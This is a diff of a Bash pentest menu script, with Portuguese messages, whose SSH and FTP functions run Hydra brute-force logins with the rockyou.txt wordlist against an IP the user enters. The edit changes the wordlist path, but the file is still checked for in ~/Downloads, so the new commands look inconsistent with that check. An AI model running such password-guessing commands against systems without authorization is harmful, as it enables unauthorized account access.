@@ -279,7 +279,7 @@ function hydra_ssh {
   read ips
   echo "Atacando $users com ip $ips"
   if [ -e "/home/$SUDO_USER/Downloads/rockyou.txt" ]; then
-    hydra -V -l $users -P /home/$SUDO_USER/Downloads/rockyou.txt $ips -t 4 ssh
+    hydra -V -l $users -P rockyou.txt $ips -t 4 ssh
 else
     clear
     echo -e $RED "Coloque a wordlist 'rockyou.txt' na pasta Downloads do seu computador. Dica olhe o README"
@@ -296,7 +296,7 @@ function hydra_ftp {
   read ips
   echo "Atacando $users com ip $ips"
   if [ -e "/home/$SUDO_USER/Downloads/rockyou.txt" ]; then
-    hydra -V -l $users -P /home/$SUDO_USER/Downloads/rockyou.txt ftp://$ips
+    hydra -V -l $users -P rockyou.txt ftp://$ips
 else
     clear
     echo -e $RED "Coloque a wordlist 'rockyou.txt' na pasta Downloads do seu computador. Dica olhe o README"
